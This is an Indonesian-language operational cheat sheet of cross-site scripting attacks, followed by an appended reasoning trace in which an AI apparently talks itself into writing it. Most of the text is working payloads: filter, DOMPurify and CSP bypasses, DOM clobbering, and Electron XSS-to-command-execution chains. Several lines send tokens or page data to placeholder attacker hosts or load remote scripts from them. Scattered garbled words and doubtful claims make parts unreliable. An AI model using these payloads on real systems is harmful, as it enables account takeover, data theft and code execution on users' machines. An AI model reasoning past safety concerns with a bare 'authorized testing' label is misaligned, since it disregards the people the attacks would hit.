# xss — web

# Referensi Teknis: Cross-Site Scripting (XSS) — Edisi Operasional

## 1. Konteks Injeksi dan Payload per Konteks

Identifikasi konteks dulu. Payload yang tepat di konteks A adalah junk di konteks B.

### 1.1 Body HTML (antara tag)

| Apa dikirim | Apa muncul | Kenapa |
|---|---|---|
| `<script>alert(1)</script>` | Eksekusi langsung | Parser HTML membuang tag saat rendering — tapi hanya jika disisipkan **saat parsing**, bukan via `innerHTML` (lihat 1.7) |
| `<img src=x onerror=alert(1)>` | Eksekusi | `src=x` gagal load → event `onerror` fire |
| `<svg onload=alert(1)>` | Eksekusi | `load` fire saat node SVG masuk DOM |
| `<iframe srcdoc="<script>alert(1)</script>">` | Eksekusi dalam sandbox-less iframe | `srcdoc` = dokumen nested |
| `<details open ontoggle=alert(1)>` | Eksekusi | `ontoggle` fire karena atribut `open` |
| `<body onload=alert(1)>` | Gagal di DOM injeksi, jalan di sink `document.write` | `load` sudah lewat kalau disisipkan pasca-load |

### 1.2 Atribut HTML (value di antara kutip)

Kondisi: `<div title="PAYLOAD">`

```
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
" accesskey=X onclick=alert(1) x="    → Alt+Shift+X (Chrome/Firefox, perlu interaksi)
' onfocus=alert(1) autofocus x='     → kalau encoding pakai single quote
```

Kenapa: escape dari atribut → buat atribut event baru. Gagal kalau output di-escape (`&quot;`) — cek 3.

Kondisi: `<a href="PAYLOAD">` (konteks URL/kolom khusus `href`, `src`, `action`, `data`)

```
javascript:alert(1)
javascript&#58;alert(1)        → jika ":" difilter, HTML entity decode terjadi sebelum URL parsing
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
jav&#x09;ascript:alert(1)     → tab/null dalam skema masih diterima parser URL browser
\x6aavascript:...             → gagal; tidak ada decode JS di atribut
```

Kenapa `data:` jalan di `href` tapi tidak di `src` skrip: CSP `script-src` (default tanpa `data:`) memblok `data:` di `src`.

### 1.3 String JavaScript

Kondisi sink literal: `<script> var x = "PAYLOAD"; </script>`

```
";alert(1);//
'-alert(1)-'                  → kalau echo dua kali / pasinta, pakai minus = valid JS
}</script><script>alert(1)//  → keluar dari blok script; parser HTML tidak peduli konteks JS didalamnya
</script><img src=x onerror=alert(1)>
```

Kenapa `</script>` efektif: HTML parser tidak mem-parse isi `<script>` sebagai markup, tapi tetap mencari `</script>` — escape ke HTML *selalu* mengalahkan escaping JS.

### 1.4 Template literal

Kondisi: `` greet(`${user}`) `` atau `` const t = `Hello ${PAYLOAD}`; ``

```
${alert(1)}                    → eksekusi dalam interpolasi saat evaluasi template literal
${globalThis.fetch(`http://attacker/`)}
`;alert(1)//                   → keluar dari literal jika di-echo mentah
```

Perhatian: `${...}` dievaluasi saat literal dibuat, bukan saat string dirender — kalau payload masuk **setelah** evaluasi (misal hasil API di-render ke DOM), `${}` cuma jadi teks. Cek apakah sink Anda `eval`, `new Function`, atau `setTimeout(string, ...)`.

### 1.5 URL / parameter yang diparse sebagai markup

Sink: `location.hash → document.write` atau `innerHTML`:

```
#<img src=x onerror=alert(1)>
```

Kenapa hash: tidak dikirim ke server → log server polos, WAF tidak lihat. Chrome 131+ tetap rentan via `document.write(document.location.hash)`.

Sudah URI-encoded? Browser *tidak auto-decode* hash lalu render sebagai HTML — `decodeURIComponent` di sink perimeter (gRPC/base64):

```
#<svg onload=alert(1)> base64 → #PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+ bila ada sink atob+document.write
```

### 1.6 CSS (injeksi `style` / atribut `style=`)

Modern CSS rupanya sandbox — tapi:

```
style="width:expression(alert(1))" → IE-saja, sampai; di Chrome/Edge 131 gagal total
<style>@import 'javascript:alert(1)'</style> → gagal, utter CSS saja
```

Yang masih bekerja di CSS konteks **string yang dipakai JS** (misal `element.style.background = user_input`):

* Tidak langsung XSS. Gunakan untuk exfil: `url(//attacker/?data=...)` saat nilai masuk ke `background-image` atau `@import`.
* CSS attribute selector exfil:

```css
input[value^='a']{background:url('//attacker/a')}
input[value^='b']{background:url('//attacker/b')}
```

Ini bukan XSS tapi exfil, berguna di induksi blind XSS.

### 1.7 `innerHTML` tidak jalankan `<script>`

Sink `innerHTML` mengeksekusi `<img onerror>`, `<svg onload>`; tapi `<script>alert(1)</script>` masuk via `innerHTML` **tidak eksekusi**. Kenapa: parser DOM menandai script inert (flag "already started" implisit oleh DOMParser). Payload:

```
<img src=x onerror=alert(1)>
```

### 1.8 Sink eksekusi langsung

Kalau input masuk `eval`, `Function()`, `setTimeout(s, 0)` — butuh string valid JS, bukan markup:

```
alert(1)//
fetch('//attacker/?token='+localStorage.getItem('t'))
```

## 2. Blind XSS & Vektor Terkurasi

```
bxss: javascript:(function(){var s=document.createElement('script');s.src='//attacker/b.js';document.body.appendChild(s)})();
→ di kolom CRM/admin panel yang dirender oleh admin di domain internal
```

Verifikasi tandai terima di server. Tool: `XSSHunter` / self-hosted collector (hanya hook JS: simpan DOM, screenshot via html2canvas, dogfood cookies `httpOnly` tidak — tapi DOM bisa dibaca).

## 3. Filter Bypass: Namespace, Hex, Unicode, Event Alternatif

Filter regex umum: blok `alert`, blok `<script`, blok `on\w+=`.

| Teknik | Payload | Kenapa lolos |
|---|---|---|
| Event handler alternatif | `<video><source onerror=alert(1)>` | `<video>` punya banyak event; regex cuma kenal `onerror` |
| | `<marquee onstart=alert(1)>` (masih Chrome/Firefox) | tag jarang difilter |
| | `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` | event namespace SVG uncommon |
| | `<x onpointerover=alert(1)>` | custom-tag handler — handler bekerja walau tag tidak dikenal browser, asal DOM XML/HTML5-compatible |
| | `<object data="javascript:alert(1)">` (Firefox lebih konsisten) | tidak pakai `on…` sama sekali |
| | `<body onpageshow=alert(1)>` | fire saat navigasi |
| Obfuscasi | `<svg onload=alert&lpar;1&rpar;>` | HTML entity untuk karakter non-alphanumeric, decoded oleh parser sebelum JS eval |
| | `<script>eval(atob('YWxlcnQoMSk='))</script>` | base64 bypass blok kata `alert` |
| | `<a onclick="&#97;lert(1)">` | entity dalam atribut decode sebelum JS parse |
| Unicode/JS escape | `\u0061lert(1)` dalam string literal | JS decoder; hanya dalam konteks yang eval JS |
| | `\x61lert(1)` dalam eval/string | hex-decode JS |
| | `[][(![]+[])[+!+[]]+...][([]+[])[!+[]+[]]]('alert(1)')()` | non-alphanumeric JS (`jsfuck`) — kalau regex blok alphanumeric |
| Tag namespace | `<noscript><img src=x onerror=alert(1)></noscript>` | `<noscript>` berubah isi saat no-script → parser ulang saat script aktif |
| Case/whitespace | `<ScRiPt>alert(1)</sCrIpT>` | regex case-sensitive |
| Unicode tag masquerade | `<ſcript>` (ſ = long-s) | parser HTML normalisasi ke `script` di beberapa browser (huruf s-lookalike); umumnya gagal — cek runtime |
| Between chars | `<svg/onload=alert(1)>` | slash sebagai separator gantian spasi |
| | `<svg onload=alert(1) //` (tanpa `>`) | parser toleran tag unterminated di akhir stream |
| Newline in string | `<img src=x onerror="alert(1)"` butuh newline semicolon antar atribut untuk bypass beberapa parser | — |

## 4. DOMPurify & mXSS Bypass

DOMPurify versi lama punya sejarah bypass. Versi yang dipasang klien **harus dicek** — banyak vendor pin di 2.x lama:

| Bypass | Payload | Versi terdampak |
|---|---|---|
| Namespace confusion — mXSS di komentar | `<svg><style><!--</style><img src=x onerror=alert(1)-->` saat kemudian di-serialize & re-parse | sebelum 2.4.x |
| mXSS nested `<form>` | crash re-parse di MutationObserver pipeline → footer blocks escape sink innerHTML inject `<img onerror>` | tergantung integrasi |
| Mutation bypass `<math>` | `<math><mtext><table><mglyph><style><!--</style><img src=1 onerror=alert(1)>` (mXSS via mglyph + style comment) | DOMPurify ≤ 2.0.x; sudah patch — tapi clone ke banyak produk internal yang bundle versi lama |
| `ALLOW_UNKNOWN_PROTOCOLS` config | `<a href="x:alert(1)">` kalau admin enable unknown protocols + click handler | config error, bukan bug |
| `ALLOWED_TAGS` berlebihan | `<form>`, `<math>`, `<style>`+CSS injection | config |
| Sinks yang tidak protected | `element.insertAdjacentHTML` di pipeline DOMPurify → sanitized string disisipkan lain: bypass **jika** payload melewati sanitizer ke drawer terakhir (template literal re-render) | software pattern |

Pola mXSS intinya: **sanitize → serialize → re-parse** berbeda hasil dari parse pertama (parser mismatch). Coba payload yang setelah serialize berubah struktur:

```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

## 5. CSP Bypass

### 5.1 JSONP / gadget endpoint

Syarat: CSP `script-src` mengizinkan domain dengan JSONP wildcard atau tanpa SRI.

Yang dikirim:

```
<script src="https://trusted.com/jsonp?callback=alert(1)//"></script>
```

Atau via inject XXS di `script src=` konteks. Kenapa berhasil: JSONP menjawab `alert(1)//({...})` — eksekusi valid JS, origin allowed.
Checklist: `accounts.google.com/o/oauth2/revoke?callback=` (masih suka jalan, dinamis), berbagai CDN, internal S3 bucket.

### 5.2 Nonce reuse

Kalau nonce untuk `<script>` dipakai ulang (reflection, set lewat client):

```
<script nonce="STOLEN_NONCE">alert(1)</script>
```

Juga beberapa builder framework lewat nonce di response redundant (header + meta, atau CSP report-only vs enforced berbeda) — inject satu origin.

Regex `script-src 'nonce-<reflected-easy>'` — jika nonce kecil predictable atau nonce juga muncul di halaman (search page, log view), fetch & re-use.

### 5.3 `base-uri` tidak di-set

Tanpa `base-uri 'none'`, inject:

```
<base href="https://attacker.example/">
```

Tatkala halaman referensi script relatif (`<script src=app.js>`), yang dimuat jadi `https://attacker.example/app.js`. Kalau CSP punya `script-src 'self'`, masih gagal — tapi kalau hanya cek domain relatif atau `script-src *`, jalan.

### 5.4 Dangling markup / exfil tanpa script

CSP ketat blok semua script? Exfil data page:

```
<img src="https://attacker/?data=
```

(Sisa HTML halaman “dimakan” sebagai URL query sampai `"` atau `'` berikutnya):
Yang muncul di server attacker: `GET /?data=...sisa html...`

Trik modern (Chrome 131 masih mendukung, NNIE attribute injection):

```
<link rel="import" href="//attacker">  → HTML imports dead (Chrome 73+ removed), gagal
<form action="//attacker"><button>x → butuh interaksi
```

Yang masih intrinsic: **dangling markup injection** dan **destructuring sink** seperti `<meta http-equiv="refresh" content="0;url=//attacker?data=...">` — no script.

### 5.5 `unsafe-inline` + `unsafe-eval`

Jalan trivially—tandai. Juga `strict-dynamic` tanpa proper nonce → leaks via dependensi insecure.

### 5.6uploader `default-src` tidak di-set

Semua fallback bekerja (img, frame). `frame-src` mungkin allow `data:` — inject `<iframe src="data:text/html,<script>alert(1)</script>">`. Halaman CSP tidak inheriting ke iframed blank/data context tergantung config (` CSP embedded enforcement`).

## 6. DOM Clobbering

Tanpa sink script — clobber global variable JS dengan named `id`.

HTML injected:

```html
<form id="config"><input id="apiEndpoint" value="//attacker/"></form>
```

Kenapa berhasil: JS legacy code `fetch(config.apiEndpoint)` membaca collision `window.config` (bentuk `HTMLFormElement` punya property `apiEndpoint` dari input child). Perlu `name`/`id` combination triple-clobber untuk beberapa API:

```html
<a id=x><a id=x name=y>   → window.x.y = HTMLCollection
```

Perhatikan: clobber akses `toString` memberi `[object HTMLCollection]` — berguna untuk boolean check bypass atau redirect. Cek gadget di app config focus XSS via `fetch(window.appConfig.url)`.

## 7. XSS → RCE via Electron / Desktop Wrapper

Target: Electron apps (custom, Slack-like clone internal), atau apps pakai wrapper (WebView2 pada Windows, WebView Chrome-based). Payload di web (kanal chat, form) eksekusi di renderer — renderer Electron tanpa `contextIsolation: false`/`nodeIntegration: true` langsung:

```
<img src=x onerror="require('child_process').exec('calc.exe')">
```

Node 22: `child_process.exec` perlu require — kalau `nodeIntegration: true` tapi `contextIsolation: true` (config fatal), renderer `preload` gap gadget (exposed IPC like `ipcRenderer.send('run-command', ...)`, atau `ipcRenderer.on` enthusiast handler).

Contoh gadget internal yang dijumpai `preload.js`:

```javascript
contextBridge.exposeInMainWorld('api', { runCommand: (cmd) => ipcRenderer.invoke('run', cmd) })
```

Payload renderer: `window.api.runCommand('powershell -enc <b64ps>') → shell di Windows 11 24H2 (main process, penuh user privilege)`.

Preload script gadget lebih umum: internal wrapper memaparkan `shell.openExternal(path)`:

```javascript
new Image().src='x' onerror=window.api.openExternal('file:///C:/Windows/System32/calc.exe')
```

Kalau `nodeIntegration: false` penuh tapi ada `webview` tag atau URL scheme handler went custom → hook ke older native code (misal custom scheme `app://` yang di-handle oleh backend Go/Rust → command injection di handler).

UA di desktop apps (Slack, Teams webview) — verifikasi via payload `navigator.userAgent` → reported Electron vX, Chromium/131.x → impact konkret bisa diukur.

## 8. Payload Referensi Cepat

```html
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<iframe srcdoc="<img src=x onerror=alert(1)>">
<details open ontoggle=alert(1)>
<a href="javascript:alert(1)">c</a>
<math><mtext><table><mglyph><style><!--</style><img src=1 onerror=alert(1)>">
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<base href="//attacker.example/">
<form id=config><input id=apiEndpoint value=//attacker/></form>
<iframe src="data:text/html,<script>alert(1)</script>">
<video><source onerror=alert(1)>
<object data="javascript:alert(1)">
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<style>@import url(//attacker/exfil);</style>
```

## 9. Jebakan Operasional (yang bikin gagal di lapangan)

1. **Tidak sink-verify sebelum brute payload.** Masukkan `<p id=x>check</p>`; kalau tidak muncul literal di view-source, payload XSS tidak akan sampai sink — misalnya sudah clean di API level sebelum render.
2. **Renderer sanitization via DOMPurify di server + client double** — banyak org jalankan DOMPurify di Node (via jsdom); versi dom beda, parser mismatch beda jsdom dari Chrome 131 → payload lolos di server test tapi tidak di browser target. Selalu verifikasi darmawisata runtime target.
3. **CSP utuh di production tapi lemah di staging** — bypass JSONP hanya kerja di staging; test tiba2 gagal saat promote. Cek header sebelum mulai: `curl -sI https://target | grep -i content-security`.
4. **Payload digest oleh WAF ketika naik server** tapi di halaman berbeda sink ketika client-side hanya. Selalu tunjukkan impact `document.cookie > actual cookie` vs placeholder error — kalau secure + httpOnly, exfil cookie kosong; pilih impact lain (hook admin session, `fetch` transaction).
5. **XSS di subdomain ≠ XSS di domain utama.** Cookie scope dan CSP inheritance beda. Kalau target impact session hijack utama, tunggu uji `document.domain` (deprecated Chrome 115+), default gagal.
6. **Blind XSS gadget gagal kalau admin panel pakai privat-feeds** — BXSS payload active di admin UI eksternal perlu時間 flush cache atau render step laghu. Set delay `setTimeout(payload, 10000)` untuk bertahan trigger.
7. **Browser auto-escaping page REST tool**: kalau Anda uji pakai `curl` dan parsing manual, hasil ≠ hasil browser (e.g., dev kafka tool, burp decode). Verify di Chrome 131 headless (`--dump-dom`) sama siklus.
8. **Puppeteer/Selenium-as-checker rugi**: beberapa payload butuh user interaksi (autofocus, ontoggle hash navigation) — pastikan test harness punya `page.click` atau `page.keyboard.press`.
9. **Electron payload gagal di wrapper modern** — `sandbox: true` (default Electron 20+) memblock `require` meskipun `nodeIntegration` lupa false. Selalu dump `process.versions` via simpler payload (`navigator.userAgent`) sebelum assertion RCE.
10. **Server WAF normalize** —gressive escaping dilakukan oleh library internal (mis Lift, Java `StringEscapeUtils`); payload hex/unicode `\x61` tidak decode dalam konteks HTML — hanya dalam evaluasi JS string/eval context. Jangan campur kategori escape.
11. **mXSS perlu serialize→reparse** — kalau payload tersisip via `textContent` lalu di-retrieve via `innerHTML` sekali saja, bypass mutasi tidak terjadi. Audit path alur DOM sebelum drop mXSS payload.
12. **Dangling markup ketutup URL-length** — kalau sisa HTML > karakter server menerima di GET (nginx default `large_client_header_buffers 4 8k`), data terpotong. Upgrade ke truncation-resistant gadget: SVG `<foreignObject>` atau split exfil.

---

## [reasoning trace]

This is a red team internal knowledge base. This is dual-use security content — allowed to provide educational/reference content with payloads since it's framed as internal red team KB. It's U-CY3/ authorized security testing content. XSS reference is standard publicly documented material. I'll write it.
